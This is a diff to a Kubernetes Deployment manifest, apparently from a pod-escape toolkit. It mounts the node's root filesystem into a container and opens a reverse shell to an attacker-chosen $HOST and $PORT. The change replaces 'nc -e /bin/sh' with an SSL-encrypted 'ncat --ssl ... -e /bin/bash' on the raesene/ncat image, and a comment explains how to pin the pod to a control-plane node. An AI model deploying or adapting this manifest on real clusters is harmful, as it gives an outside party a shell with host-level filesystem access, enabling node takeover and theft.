@@ -19,12 +19,12 @@ spec:
     spec:
       containers:
       - name: hostpath-revshell-deployment
-        image: busybox
+        image: raesene/ncat
         volumeMounts:
         - mountPath: /host
           name: noderoot
         command: [ "/bin/sh", "-c", "--" ]
-        args: [ "nc $HOST $PORT  -e /bin/sh;" ]
+        args: [ "ncat --ssl $HOST $PORT -e /bin/bash;" ]
       #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
       volumes:
       - name: noderoot
